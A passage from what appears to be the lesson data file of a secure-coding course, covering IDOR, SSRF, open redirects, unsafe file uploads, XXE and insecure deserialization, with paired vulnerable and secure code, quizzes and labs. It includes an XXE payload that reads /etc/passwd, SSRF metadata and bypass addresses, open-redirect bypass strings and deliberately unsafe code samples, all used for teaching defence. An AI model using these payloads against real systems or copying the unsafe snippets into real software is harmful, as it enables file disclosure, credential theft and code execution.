      explanation:
        "The safest pattern is a scoped query: the ownership predicate is part of the database call, so a wrong owner produces an empty result instead of a foreign document. Using 404 rather than 403 also avoids telling an attacker which ids exist, and the role check reads the role from the session, never from a field the client can edit."
    },
    prevention: [
      "Never trust an object id, file name or any identifier that came from the client.",
      "Add ownership or permission predicates to EVERY query that returns a single object or a list.",
      "Check permissions on the server for every request - the frontend hiding a button is not a control.",
      "Prefer unguessable identifiers (UUIDs) as defence in depth, but never as the only control.",
      "Return 404 rather than 403 for objects the user may not see, so ids cannot be enumerated.",
      "Log access-denied events; a burst of 403/404s on sequential ids is a clear attack signal.",
      "Write an automated test: log in as user A, request user B's object, expect 404."
    ],
    securePractices: [
      "Make authorisation a reusable helper so it cannot be forgotten on one route.",
      "Ask for every route: 'who is asking, and is THAT person allowed THIS object?'",
      "Default to deny. New routes should be inaccessible until a check is added.",
      "Return the minimum fields a screen needs, not the whole database document.",
      "Keep a spreadsheet or diagram of roles and permissions; reviewers need something to check against."
    ],
    furtherReading: [
      "OWASP Authorization Cheat Sheet",
      "OWASP Testing Guide - IDOR",
      "OWASP API Security Top 10 - Broken Object Level Authorisation"
    ],
    quiz: [
      {
        question: "What is the minimum a route must check to avoid IDOR?",
        options: [
          "That the id is a valid number",
          "That the id is unpredictable",
          "That the requesting user owns or may access THAT object",
          "That the request came over HTTPS"
        ],
        correctIndex: 2,
        explanation:
          "Object-level authorisation is the actual control. Unpredictable ids only slow an attacker down; they are not a permission check."
      },
      {
        question: "Why prefer 404 over 403 when a user may not see an object?",
        options: [
          "403 is deprecated",
          "A 403 confirms the object exists, which helps an attacker enumerate ids",
          "404 is faster",
          "It avoids needing a session"
        ],
        correctIndex: 1,
        explanation:
          "403 leaks existence. 404 for both 'does not exist' and 'not yours' keeps the enumeration game closed."
      },
      {
        question: "Where should the role/permission come from?",
        options: [
          "A query parameter the client sends",
          "A header the client can set",
          "The server-side session or a verified token, never the request",
          "localStorage"
        ],
        correctIndex: 2,
        explanation:
          "Anything the client can edit is an attacker's input. Permissions must come from something the server issued and trusts."
      }
    ],
    lab: {
      title: "Audit 10 routes for object-level authorisation",
      type: "design-review",
      task:
        "Take a small local app (or a written list of 10 routes) and mark each one as SAFE or UNSAFE, giving the reason in one line. Then fix every UNSAFE route you found.",
      steps: [
        "For each route, write the query and mark whether the session user's identity appears in it.",
        "Separate 'is logged in' from 'is allowed this object' - most bugs are in the gap between them.",
        "Check list endpoints too: does the query filter by owner, or return everyone's rows?",
        "Fix by adding an ownership predicate in the query, then retest as a second user."
      ],
      hint: "Grep your own code for findById and ask, for each hit, 'whose record is this?'",
      solution:
        "Every read and write must include the owner or an explicit permission in the query. IDOR is rarely a single bug: it is a missing condition repeated across routes. The fix that scales is a helper such as findOwned(Model, id, session.userId) used everywhere, plus a test that logs in as two users and asserts the cross-user request returns 404.",
      isSafe: true,
      estimatedMinutes: 25
    }
  },

  /* ---------------------------------------------------------------- */
  ssrf: {
    title: "Server-Side Request Forgery (SSRF)",
    relatedConcepts: ["injection", "broken-access-control", "idor", "insecure-design"],
    simpleExplanation:
      "SSRF happens when your SERVER fetches a URL that a user supplied. Because the request comes from your server, it can reach things the user could never reach directly: services on localhost, cloud metadata endpoints, or internal admin panels. In the 2021 list this was A10; OWASP later moved SSRF into Broken Access Control.",
    whyItHappens:
      "Features like 'import from URL', 'preview this image', 'check this webhook' or 'download a file' naturally take a URL. The developer fetches it without asking whether the host is allowed. The mistake is trusting a URL as a location instead of treating it as untrusted input to a privileged network position.",
    howItWorks:
      "1. A user submits imageUrl=https://evil.test/logo.png for an avatar. 2. Your server calls fetch(imageUrl). 3. Instead, or in addition, the attacker submits http://127.0.0.1:6379/ or http://169.254.169.254/latest/meta-data/. 4. Your server, sitting inside the network, is allowed to talk to those addresses. 5. The response is returned to the attacker, so internal data leaks. With a redirect-following fetch, a public host can even bounce the request to an internal address.",
    safeExample:
      "It is a company employee who is allowed to go to the post office but uses the same desk pass to enter the server room next door. The pass works because the door only checks 'is this a pass from this company'. The fix is a list of buildings that employee is allowed to enter - an allow-list of hosts.",
    impact: [
      "Read cloud instance metadata and steal IAM credentials or service account tokens.",
      "Scan and reach internal services that are not exposed to the internet.",
      "Interact with databases, caches, admin panels and CI systems from inside the network.",
      "Bypass firewalls and IP allow-lists, because the traffic originates from your server.",
      "Used with redirects, it defeats simple string checks on the URL."
    ],
    typicalSeverity: "high",
    vulnerableCode: {
      language: "javascript",
      filename: "express route - IN SAFE",
      code: `app.post("/avatar", async (req, res) => {
  const url = new URL(req.body.imageUrl);   // parses, but TRUSTS the host

  // No allow-list! The server will happily call localhost or the
  // cloud metadata service, which the user could never reach.
  const r = await fetch(url, { redirect: "follow" });
  const buf = Buffer.from(await r.arrayBuffer());
  await Avatar.create({ userId: req.session.userId, data: buf });
  res.json({ ok: true });
});`,
      walkthrough: [
        "Line 2: parsing the URL proves nothing about the host - the host is still attacker controlled.",
        "The missing allow-list is the vulnerability. Without it, any scheme/host/port the server can reach is fair game.",
        "redirect: 'follow' makes it worse: a public host can reply 302 to http://127.0.0.1/ and the fetch will follow it.",
        "Also missing: disabling non-HTTP schemes such as file://, and a timeout plus a size cap."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "express route - SAFE",
      code: `const dns = require("dns").promises;
const net = require("net");

// 1) Reject anything that is not plain public HTTP(S).
function isPrivateAddress(ip) {
  return (
    ip === "127.0.0.1" || ip.startsWith("127.") ||
    ip === "::1" || ip.startsWith("fc") || ip.startsWith("fd") || // unique local
    ip.startsWith("169.254.") ||                             // cloud metadata
    ip.startsWith("10.") || ip.startsWith("192.168.") ||
    /^172\\.(1[6-9]|2\\d|3[01])\\./.test(ip) ||                // 172.16-31
    ip.startsWith("0.") ||
    net.isIPv4(ip) === false && net.isIPv6(ip) === false
  );
}

async function assertPublicUrl(raw) {
  const url = new URL(raw);

  // scheme allow-list - blocks file:, gopher:, data:
  if (url.protocol !== "https:" && url.protocol !== "http:") {
    throw new Error("Only http(s) URLs are allowed");
  }
  // port allow-list - blocks weird internal service ports
  if (![80, 443].includes(Number(url.port || (url.protocol === "https:" ? 443 : 80)))) {
    throw new Error("Port not allowed");
  }

  // Resolve FIRST, then check the real IP. This is the crucial step:
  // "evil.test" can resolve to 127.0.0.1.
  const { address } = await dns.lookup(url.hostname);
  if (isPrivateAddress(address)) throw new Error("Internal address blocked");

  return url;
}

app.post("/avatar", async (req, res) => {
  try {
    const url = await assertPublicUrl(req.body.imageUrl);

    // 2) Do NOT follow redirects blindly, and pin the destination.
    const r = await fetch(url, {
      redirect: "manual",
      signal: AbortSignal.timeout(4000),
      headers: { "user-agent": "AvatarFetcher/1.0" }
    });
    if (r.status >= 300 && r.status < 400) {
      throw new Error("Redirects are not followed");
    }
    if (!r.headers.get("content-type")?.startsWith("image/")) {
      throw new Error("Not an image");
    }
    const buf = Buffer.from(await r.arrayBuffer());
    if (buf.length > 2 * 1024 * 1024) throw new Error("Image too large");
    await Avatar.create({ userId: req.session.userId, data: buf });
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});`,
      explanation:
        "The core idea is: allow a list of destinations, resolve the hostname, and check the resulting IP is public. Everything else - scheme, port, redirects, timeout, size, content type - closes one more bypass. Note that DNS can change between your check and the real connection (DNS rebinding), so a production system should also pin the resolved IP or use a dedicated egress proxy."
    },
    prevention: [
      "Use an allow-list of hosts, or block private, loopback, link-local and unique-local ranges.",
      "Resolve the hostname and validate the resulting IP address, not just the string in the URL.",
      "Restrict the scheme to http/https and the port to 80/443.",
      "Do not follow redirects automatically, or re-validate the destination on every hop.",
      "Run outbound fetches through a controlled proxy or a separate network segment with no access to internals.",
      "Apply timeouts, response size caps and content-type checks.",
      "Never return the raw upstream response to the user; that is a second data leak."
    ],
    securePractices: [
      "Treat every URL as untrusted input, exactly like a file path.",
      "Ask what the fetch is for. If it can be replaced with a file upload, the SSRF disappears.",
      "Put the allow-list in one helper so a new feature cannot forget it.",
      "Block egress at the network layer too - application checks can be bypassed, firewalls cannot.",
      "Beware parsers that accept alternative IP notations, such as decimal, octal or IPv6-mapped forms."
    ],
    furtherReading: [
      "OWASP Server-Side Request Forgery Prevention Cheat Sheet",
      "OWASP Testing Guide - SSRF"
    ],
    quiz: [
      {
        question: "Why is checking url.startsWith('https://') not enough?",
        options: [
          "It is enough",
          "An attacker can use a public host that redirects to an internal address, or a hostname that resolves to a private IP",
          "It is too slow",
          "It breaks TLS"
        ],
        correctIndex: 1,
        explanation:
          "The host string can lie about where the connection ends up. You must resolve it, check the IP, and control redirects."
      },
      {
        question: "What is the main value of an allow-list for fetched URLs?",
        options: [
          "It makes the fetch faster",
          "It means only destinations you explicitly intended can ever be contacted",
          "It hides the URL from the user",
          "It replaces HTTPS"
        ],
        correctIndex: 1,
        explanation:
          "An allow-list converts an open-ended capability ('can reach anything the server can reach') into a small, reviewed set."
      },
      {
        question: "Which address is most valuable to SSRF attackers and why?",
        options: [
          "8.8.8.8, a public DNS server",
          "169.254.169.254, the cloud instance metadata service, because it often returns temporary credentials",
          "1.1.1.1, a public CDN",
          "The website's own domain"
        ],
        correctIndex: 1,
        explanation:
          "The link-local metadata endpoint is reachable from inside the instance and can hand out IAM credentials, so blocking 169.254.0.0/16 is a standard SSRF control."
      }
    ],
    lab: {
      title: "Write an SSRF-safe URL fetcher",
      type: "fix-the-code",
      task:
        "Write assertPublicUrl(raw) from scratch: scheme check, port check, DNS resolve, private-range check. Then list the bypasses you still have not covered.",
      steps: [
        "Write the naive version and predict what it allows.",
        "Add the checks one at a time, predicting the effect of each.",
        "Test your function against a list of inputs you invent: localhost, 127.0.0.1, 169.254.169.254, [::1], 2130706433 (decimal for 127.0.0.1), and a public host.",
        "Write down two remaining bypasses you would fix next (DNS rebinding, TOCTOU)."
      ],
      hint: "Decimal and IPv6-mapped notations are the classic filter bypasses.",
      solution:
        "A correct implementation validates the scheme, the port, resolves the hostname, and rejects every private, loopback, link-local and unique-local range including IPv6 and decimal notations. The residual risks are DNS rebinding (the answer changes between check and connect) and time-of-check/time-of-use races, which you address by pinning the validated IP for the actual connection or by routing egress through a filtering proxy.",
      isSafe: true,
      estimatedMinutes: 25
    }
  },

  /* ---------------------------------------------------------------- */
  "open-redirect": {
    title: "Unvalidated Redirects and Forwards",
    relatedConcepts: ["xss", "ssrf", "broken-access-control"],
    simpleExplanation:
      "An open redirect is a page that sends the visitor to whatever address is in the URL. Attackers use it to make a link look trustworthy - a login page at your real domain - and then land the victim on a convincing copy of that page to steal their password.",
    whyItHappens:
      "The feature exists for good reasons: continue after login, return to the page you came from, shortened links. The mistake is trusting a destination supplied by the client, or checking only that the value 'looks like a URL' with startsWith('http'), which a value like https://evil.test can satisfy while still being a completely different site.",
    howItWorks:
      "1. The attacker builds https://bank.test/login?next=https://bank.test.evil.test/steal. 2. The victim trusts the real domain, types their password, and is forwarded on. 3. The phishing page mimics the real site, harvests the credentials, and the victim often blames the real site.",
    safeExample:
      "It is a trusted receptionist who will happily call any number you give them. The number looks local, but it belongs to someone else - and the receptionist's uniform makes it believable. A safe receptionist only calls numbers on a written approved list.",
    impact: [
      "Credential phishing with a link that genuinely starts at the real domain.",
      "Bypass of allow-list or mail-filter rules that trust the link's origin.",
      "Chaining with OAuth or SSO flows, where the code is delivered to the wrong party.",
      "Damage to the brand, because the attack benefits from your domain's credibility."
    ],
    typicalSeverity: "medium",
    vulnerableCode: {
      language: "javascript",
      filename: "express route - IN SAFE",
      code: `app.get("/login", (req, res) => {
  const next = req.query.next || "/dashboard";
  // DANGEROUS: an absolute URL from the query string is sent to
  // the browser as a Location header.
  res.redirect(next);
});

// /login?next=https://bank.test.evil.test/steal
// The link starts with https://bank.test, so it passes any
// "starts with our domain" check a human would make.`,
      walkthrough: [
        "Line 2: the default only applies when the parameter is missing; any supplied value is used as-is.",
        "Line 4: res.redirect on an absolute URL is a full navigation to a foreign site.",
        "Missing: an allow-list. A safe redirect destination should be a relative path or a value from a fixed set."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "express route - SAFE",
      code: `const SAFE_HOSTS = new Set(["bank.test", "www.bank.test"]);

function safeRedirectTarget(raw, fallback = "/dashboard") {
  // 1) Prefer a RELATIVE path. Anything starting with "/" but not
  //    "//" stays on our own origin.
  if (typeof raw === "string" && raw.startsWith("/") && !raw.startsWith("//")) {
    return raw;
  }

  // 2) If an absolute URL is genuinely needed, compare the parsed
  //    host with an allow-list - never with startsWith, and never
  //    with a regex that forgets to anchor.
  try {
    const url = new URL(raw);
    if (url.protocol === "https:" && SAFE_HOSTS.has(url.host)) {
      return url.toString();
    }
  } catch {
    return fallback;   // not a valid URL at all
  }
  return fallback;
}

app.get("/login", (req, res) => {
  res.redirect(safeRedirectTarget(req.query.next));
});`,
      explanation:
        "The strongest form of this control is 'only ever redirect to a relative path on our own site'. If absolute URLs are a real requirement, parse the URL and compare the exact host against an allow-list - never a string prefix, because 'https://bank.test.evil.test' starts with 'https://bank.test'."
    },
    prevention: [
      "Only redirect to relative paths you generated yourself, such as /dashboard.",
      "If absolute URLs are needed, parse them and match the exact host against an allow-list.",
      "Never use startsWith or a substring check to validate a domain.",
      "Do not put the raw destination in a link the user must click; redirect directly after a POST.",
      "Shorten links with a server-side id, never with a user-supplied destination."
    ],
    securePractices: [
      "Validate URLs by PARSING them, then compare parts - never by reading the string.",
      "Write the parser once and use it for redirects, callbacks, webhook URLs and CORS origins.",
      "Add a test for the classic bypass: https://real.test.evil.test must be rejected.",
      "Remember OAuth redirect URIs: an allow-list there prevents a whole class of token theft."
    ],
    furtherReading: [
      "OWASP Unvalidated Redirects and Forwards Cheat Sheet",
      "OWASP Authentication Cheat Sheet (redirect validation)"
    ],
    quiz: [
      {
        question: "Why is next.startsWith('https://bank.test') an unsafe redirect check?",
        options: [
          "startsWith is slow",
          "Because https://bank.test.evil.test also starts with that string, and the user is fooled by a trusted-looking link",
          "It does not work in Express",
          "It allows POST requests"
        ],
        correctIndex: 1,
        explanation:
          "Substring checks on a domain are always bypassable by an attacker who registers a domain that starts with your string. Parse and compare the exact host."
      },
      {
        question: "The safest redirect target is...",
        options: [
          "Any URL that begins with /",
          "A relative path such as /dashboard that you generated, or an exact host from an allow-list",
          "The previous page's URL",
          "A shortened link"
        ],
        correctIndex: 1,
        explanation:
          "Relative paths you generate yourself cannot leave your origin. Note that '//evil.test' is a protocol-relative URL and must be rejected too."
      }
    ],
    lab: {
      title: "Test your own redirect validator",
      type: "identify-the-bug",
      task:
        "Write safeRedirectTarget and then attack it with a list of 10 tricky inputs you invent yourself.",
      steps: [
        "List candidate bypasses: //evil.test, /\\\\/evil.test, https://bank.test.evil.test, javascript:alert(1), https://evil.test\\@bank.test, and absolute paths to other ports.",
        "Run each through your function and record the result.",
        "Fix the failures and re-test."
      ],
      hint: "URL parsers disagree with humans about where the authority part ends. That disagreement is the whole game.",
      solution:
        "A validator based on a single startsWith check will always lose to a clever host. The robust design is: allow only strings that start with a single '/' and are not '//' and do not contain a backslash, and otherwise parse the URL and require an exact host match from a small allow-list. Add every bypass you found to the test suite so a future refactor cannot reintroduce one.",
      isSafe: true,
      estimatedMinutes: 15
    }
  },

  /* ---------------------------------------------------------------- */
  "malicious-file-execution": {
    title: "Malicious File Execution",
    relatedConcepts: ["injection", "insecure-design", "vulnerable-components"],
    simpleExplanation:
      "This category is about letting untrusted files run as code on your server. A user uploads a file, and the application stores it somewhere the web server will execute - a CGI script, a PHP file, a JSP page, or a directory where the interpreter picks it up. A 2007 OWASP category, later absorbed into other entries as upload handling improved.",
    whyItHappens:
      "Uploads are saved into the web root or an upload folder that the application server is configured to execute. The code checks the extension, but extensions are easy to disguise (file.php.jpg, or a name with a null byte or a trailing dot on some systems). The deeper mistake is architectural: data and executable code share one directory.",
    howItWorks:
      "1. The upload form accepts any file. 2. The file is saved to /www/uploads/avatar.png. 3. An attacker submits a file that the interpreter recognises as a script despite the .png name, or uploads a .cgi/.jsp file. 4. Visiting /uploads/avatar.png runs the script as the web server user, giving remote code execution.",
    safeExample:
      "It is a school where the library shelves and the chemistry lab are the same room. Anything stored on the shelf can be handled with lab equipment. The safe design keeps them apart: files are stored outside the executable area and only ever served as static downloads.",
    impact: [
      "Remote code execution with the web server's privileges.",
      "Full server compromise, credential theft, and lateral movement.",
      "Serving malware to every visitor who downloads the file.",
      "Long-term backdoors hidden inside the upload directory."
    ],
    typicalSeverity: "critical",
    vulnerableCode: {
      language: "javascript",
      filename: "express upload - IN SAFE",
      code: `const multer = require("multer");
const upload = multer({ dest: "/www/uploads" });   // inside the web root!

app.post("/upload", upload.single("file"), (req, res) => {
  // The check below is a BLACKLIST and runs AFTER the write.
  const blocked = [".php", ".jsp", ".cgi", ".exe"];
  const name = req.file.originalname;
  if (blocked.some((ext) => name.toLowerCase().endsWith(ext))) {
    return res.status(400).send("blocked");
  }
  // Problem 1: the file is already on disk inside the web root.
  // Problem 2: an extension blacklist is always bypassable.
  res.json({ ok: true });
});`,
      walkthrough: [
        "Line 2: the destination is inside the document root, so the web server will happily serve and possibly execute it.",
        "Line 5-8: the extension check happens after multer has already written the file, and it only matches a suffix.",
        "Problem 3: nothing verifies the file's real content type, so a script can be renamed.",
        "Problem 4: no size limit, no count limit, and no random filename - so overwriting and path tricks are possible too."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "express upload - SAFE",
      code: `const multer = require("multer");
const crypto = require("crypto");
const path = require("path");
const fs = require("fs");

// 1) Store OUTSIDE the document root, on a non-executable volume.
const UPLOAD_DIR = "/var/lib/app/uploads";
const PUBLIC_BASE = "/media";     // served by a route, not by the web server
const ALLOWED_MIME = new Set(["image/png", "image/jpeg", "image/webp"]);
const EXT_BY_MIME = { "image/png": ".png", "image/jpeg": ".jpg", "image/webp": ".webp" };

fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const upload = multer({
  dest: UPLOAD_DIR,
  limits: { fileSize: 2 * 1024 * 1024, files: 1 }
});

app.post("/upload", upload.single("file"), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: "No file" });

    // 2) Generate the name YOURSELF. Never trust the client's name,
    //    so traversal, double extensions and overwrites are gone.
    const ext = EXT_BY_MIME[req.file.mimetype];
    if (!ext || !ALLOWED_MIME.has(req.file.mimetype)) {
      throw new Error("File type not allowed");
    }
    const storedName = crypto.randomBytes(16).toString("hex") + ext;
    const finalPath = path.join(UPLOAD_DIR, storedName);

    // 3) VERIFY THE CONTENT, do not trust the declared type.
    const magic = await readMagicBytes(req.file.path);
    if (!matchesMagic(magic, req.file.mimetype)) {
      throw new Error("Content does not match the declared type");
    }
    fs.renameSync(req.file.path, finalPath);
    fs.chmodSync(finalPath, 0o640);

    await Attachment.create({
      ownerId: req.session.userId,
      storedName,
      mime: req.file.mimetype,
      size: req.file.size
    });

    // 4) Serve it through a route that streams bytes with a safe
    //    Content-Type and Content-Disposition.
    res.status(201).json({ id: storedName, url: PUBLIC_BASE + "/" + storedName });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});`,
      explanation:
        "Four independent layers: storage outside the executable area, server-generated names, an allow-list based on verified content rather than the declared type, and streaming with an explicit safe Content-Type. Any single layer can fail; together they make exploitation very hard. Also serve uploads from a separate origin if you can, so an HTML file can never run scripts in your site's origin."
    },
    prevention: [
      "Store uploads outside the web root, on a filesystem or bucket that is never executed.",
      "Rename every file to a server-generated random name; never keep the client's filename.",
      "Use an allow-list of types verified by inspecting the file's real content, not the extension or the browser-provided type.",
      "Serve uploads from a separate domain or with Content-Disposition: attachment and a fixed Content-Type.",
      "Set size, count and per-user limits to stop denial-of-service by upload.",
      "Never execute, unzip or convert uploaded content with a component that shells out.",
      "Run virus scanning for file types your organisation allows but does not fully trust."
    ],
    securePractices: [
      "Ask: 'could this file ever be interpreted as code by anything?' If yes, change the design.",
      "Keep the allow-list tiny - an allow-list of 3 image types is safer than a blacklist of 20 extensions.",
      "Test the double-extension case: file.php.png, file.png.php, and a name with a trailing space or dot.",
      "Log every upload with size, type and owner - it is useful for abuse investigations."
    ],
    furtherReading: [
      "OWASP File Upload Cheat Sheet",
      "OWASP Unrestricted File Upload"
    ],
    quiz: [
      {
        question: "Why is checking the file extension not enough?",
        options: [
          "Extensions are checked too slowly",
          "The extension can be disguised or misread, so you must verify the real content type",
          "Extensions are always correct",
          "It only matters for images"
        ],
        correctIndex: 1,
        explanation:
          "Attackers control the name. The only trustworthy signal is the file's actual content, checked with a library, combined with storage outside the executable area."
      },
      {
        question: "The single most important design decision for upload safety is...",
        options: [
          "Renaming files to .txt",
          "Storing uploads where the application server will never execute them",
          "Compressing the files",
          "Asking users not to upload scripts"
        ],
        correctIndex: 1,
        explanation:
          "If the storage location cannot execute, the upload cannot become code execution no matter what the file claims to be."
      }
    ],
    lab: {
      title: "Design a safe upload pipeline",
      type: "design-review",
      task:
        "Draw your upload flow as a sequence of checks, then attack your own design with a list of filenames.",
      steps: [
        "Write each step: name handling, storage location, type check, size check, serving method.",
        "For each of these names, decide what your design does: avatar.php, avatar.php.png, avatar.png, '..\\\\evil.png', a 2 GB zip, an SVG with script inside.",
        "For any step that fails, add the layer that fixes it."
      ],
      hint: "SVG files are XML and can contain script - a classic content-type trap.",
      solution:
        "A safe pipeline: server-generated random name, storage outside the document root on a non-executable volume, allow-list of 2-3 types verified by magic bytes, size limit, and serving with a fixed Content-Type plus Content-Disposition: attachment (or from a separate origin). SVG is usually excluded precisely because it is XML that can carry script. Defence in depth means each mistake is caught by another layer.",
      isSafe: true,
      estimatedMinutes: 20
    }
  },

  /* ---------------------------------------------------------------- */
  xxe: {
    title: "XML External Entities (XXE)",
    relatedConcepts: ["insecure-deserialization", "injection", "vulnerable-components"],
    simpleExplanation:
      "XML has a feature where a document can ask the parser to fetch another file or run a network request, and to paste the answer into the text. If your server parses XML from an untrusted source with those features enabled, an attacker can make your server read local files or contact internal services. XXE was introduced as its own category, A4, in the 2017 list.",
    whyItHappens:
      "Default parser settings. Most XML parsers are configured to resolve external entities and DTDs unless you explicitly disable it, and developers never think about XML unless the project is a SOAP API. The vulnerability is in the parser's configuration, not in the application code.",
    howItWorks:
      "1. An attacker sends a document containing a DOCTYPE with an entity definition that points at a local file. 2. The parser expands the entity, reads the file, and places the contents into the document. 3. If the app echoes the parsed field back, the file contents appear in the response. 4. With a parameter entity, the parser can also make outbound HTTP requests - turning it into SSRF or blind exfiltration.",
    safeExample:
      "It is a translator who follows any instruction written inside the document. Your rule says 'translate this text', but the document also says 'first read my.h and include it'. Turning off entity resolution is like telling the translator to translate the words and ignore any embedded orders.",
    impact: [
      "Read any file the application process can read, including source code and configuration.",
      "Server-Side Request Forgery from the server's network position.",
      "Denial of service with entity expansion, known as a billion-laughs attack.",
      "In some stacks, out-of-band exfiltration even when the response is not shown."
    ],
    typicalSeverity: "high",
    vulnerableCode: {
      language: "javascript",
      filename: "xml parsing - IN SAFE",
      code: `const { XMLParser } = require("fast-xml-parser");

// Default settings: DTDs and external entities are allowed.
const parser = new XMLParser();
app.post("/soap", async (req, res) => {
  const xml = req.body;                 // attacker controlled
  const data = parser.parse(xml);       // <-- expands entities by default
  res.json(data);
});

// Attacker payload:
// <?xml version="1.0"?>
// <!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
// <root><name>&x;</name></root>
// The response contains the contents of /etc/passwd.`,
      walkthrough: [
        "The parser is constructed with defaults, so DOCTYPE and external entities are honoured.",
        "Parsing user-supplied XML is the only requirement - there is no second flaw.",
        "The fix is parser configuration, which is why this is a 'secure defaults' lesson."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "xml parsing - SAFE",
      code: `const { XMLParser } = require("fast-xml-parser");

// 1) Create the parser ONCE with entity resolution disabled.
const parser = new XMLParser({
  processEntities: false,          // do not expand &entity;
  ignoreAttributes: false,
  // libxml-based parsers: disable DTD loading and network access too
  //   noent: false, load_dtd: false, dtdvalid: false, nonet: true
});

function parseTrustedXml(xml) {
  const text = String(xml);

  // 2) Belt and braces: reject any DOCTYPE outright, because even
  //    internal entity expansion (billion laughs) is a DoS vector.
  if (/<!DOCTYPE/i.test(text)) {
    throw new Error("DOCTYPE is not allowed");
  }

  // 3) Cap the input size before parsing.
  if (Buffer.byteLength(text, "utf8") > 512 * 1024) {
    throw new Error("Payload too large");
  }

  return parser.parse(text);
}

app.post("/soap", (req, res) => {
  try {
    res.json(parseTrustedXml(req.body));
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});`,
      explanation:
        "Two changes do it: turn off entity processing, and refuse documents that declare a DOCTYPE. Adding a size cap covers the expansion-bomb denial of service. When you cannot change the parser, put a sanitising step in front of it - and remember that JSON is not vulnerable here, which is one reason APIs moved away from XML."
    },
    prevention: [
      "Disable DTD processing, external entity resolution and network access in the XML parser.",
      "Reject any payload containing a DOCTYPE declaration if your schema does not need one.",
      "Prefer JSON for new APIs; JSON has no entity expansion.",
      "Cap input size and add a recursion or expansion limit to prevent denial of service.",
      "If you must support DTDs, sanitise the XML with a dedicated library before parsing.",
      "Run the application with the minimum file permissions, so even an XXE cannot read what it should not."
    ],
    securePractices: [
      "Treat any parser you use as security-relevant: XML, YAML, deserialisers and template engines all have dangerous modes.",
      "Create the parser once with safe options; never construct it inside a route with defaults.",
      "Add a test with the file:// entity payload and assert the response does not contain it.",
      "Check every dependency that parses XML for you - a SOAP client can hide an XXE inside a normal-looking call."
    ],
    furtherReading: [
      "OWASP XML External Entity Prevention Cheat Sheet",
      "OWASP XXE Prevention Cheat Sheet for language-specific settings"
    ],
    quiz: [
      {
        question: "What makes an XXE attack possible?",
        options: [
          "A vulnerable database",
          "An XML parser that resolves DTDs and external entities on untrusted input",
          "A missing firewall rule",
          "Using POST instead of GET"
        ],
        correctIndex: 1,
        explanation:
          "It is a parser configuration problem. Disable DTD and external entities, or refuse DOCTYPE entirely."
      },
      {
        question: "Why reject DOCTYPE declarations outright?",
        options: [
          "DOCTYPE is not valid XML5",
          "It blocks external entities and also internal entity expansion (the billion-laughs denial of service)",
          "It makes parsing faster",
          "It is required for SOAP"
        ],
        correctIndex: 1,
        explanation:
          "Refusing DOCTYPE removes external entity attacks and the expansion-bomb DoS in one rule, which is why it is such a popular control."
      }
    ],
    lab: {
      title: "Harden an XML parser",
      type: "fix-the-code",
      task:
        "Given a parser created with default options, write the safe configuration and a test that proves a file:// entity no longer works.",
      steps: [
        "Write the XXE payload you would use against your own localhost test endpoint.",
        "Change the parser options, then re-run and observe the difference.",
        "Add the DOCTYPE rejection and a size cap, and test a billion-laughs payload for the DoS angle.",
        "Note which controls are parser settings and which are application rules."
      ],
      hint: "One setting stops the file read; one rule stops the whole class of document.",
      solution:
        "Disable entity processing and DTD loading in the parser, reject any document containing a DOCTYPE, and cap the input size. Test all three: the file:// entity, the http:// entity for SSRF, and an expansion bomb for denial of service. The general lesson is that parser configuration is a security control and belongs in a reviewed, shared place.",
      isSafe: true,
      estimatedMinutes: 15
    }
  },

  /* ---------------------------------------------------------------- */
  "insecure-deserialization": {
    title: "Insecure Deserialization",
    relatedConcepts: ["integrity-failures", "vulnerable-components", "xxe", "injection"],
    simpleExplanation:
      "Deserialization means turning a byte stream back into an object. If your application rebuilds Java/Python/Node objects straight from data a client sent, the attacker controls not just the values but which classes or functions get called. In the 2017 list this was A8; in 2021 it was folded into Software and Data Integrity Failures.",
    whyItHappens:
      "Convenience. Serialising an object graph is far easier than writing a strict schema by hand, so people use it for cookies, caches, API messages and queues. The format then contains type information, and that type information is executable behaviour.",
    howItWorks:
      "1. The app stores a serialised user object in a cookie. 2. The client can edit the cookie. 3. On the next request the app deserialises it. 4. A crafted payload names a class that exists on the classpath and has a dangerous side effect when constructed - a file write, a command execution, or a network call. 5. The server performs the action during deserialisation, before any business logic runs.",
    safeExample:
      "It is a parcel delivered to your door. If the courier only reads the label, fine. But if unpacking the parcel can call a phone number printed inside, then anyone who can post a parcel controls your phone. The fix is to accept a narrow, declarative format - 'name=Ravi, role=student' - rather than a package that can run code.",
    impact: [
      "Remote code execution on the server.",
      "Arbitrary file read and write, and privilege escalation.",
      "Bypassing authentication by forging a session or token object.",
      "Denial of service through deeply nested or huge object graphs."
    ],
    typicalSeverity: "critical",
    vulnerableCode: {
      language: "java",
      filename: "Java - IN SAFE",
      code: `// A serialised object placed in a client-side cookie.
public class SessionServlet extends HttpServlet {

  protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
    String blob = req.getParameter("session");

    // DANGEROUS: ObjectInputStream will instantiate whatever classes
    // the byte stream names, and call their readObject() methods.
    Object obj = new ObjectInputStream(
        new ByteArrayInputStream(Base64.getDecoder().decode(blob))
    ).readObject();

    req.setAttribute("session", obj);   // untrusted object in the app
  }
}`,
      walkthrough: [
        "The cookie content is fully attacker controlled because cookies are not a trust boundary.",
        "ObjectInputStream.readObject() instantiates classes by name, so a gadget chain in any dependency on the classpath can execute.",
        "The dangerous code runs DURING deserialisation, which is why input validation later in the flow does not help."
      ]
    },
    secureCode: {
      language: "java",
      filename: "Java - SAFE",
      code: `// 1) Use a data-only format with an explicit schema.
public record SessionData(String userId, List<String> roles, long issuedAt) {}

public class SessionServlet extends HttpServlet {

  private final ObjectMapper mapper = new ObjectMapper();

  protected void doGet(HttpServletRequest req, HttpServletResponse resp)
      throws IOException {

    // 2) A plain JSON parser does NOT instantiate arbitrary classes.
    //    With Java records + Jackson, unknown fields are simply absent,
    //    so an attacker cannot smuggle in a new type.
    SessionData session = mapper.readValue(req.getParameter("session"),
                                          SessionData.class);

    if (session.roles() == null || !session.roles().contains("student")) {
      resp.sendError(403);
      return;
    }
    resp.getWriter().write("welcome " + session.userId());
  }
}

// 3) If you MUST use native serialisation, lock the stream down:
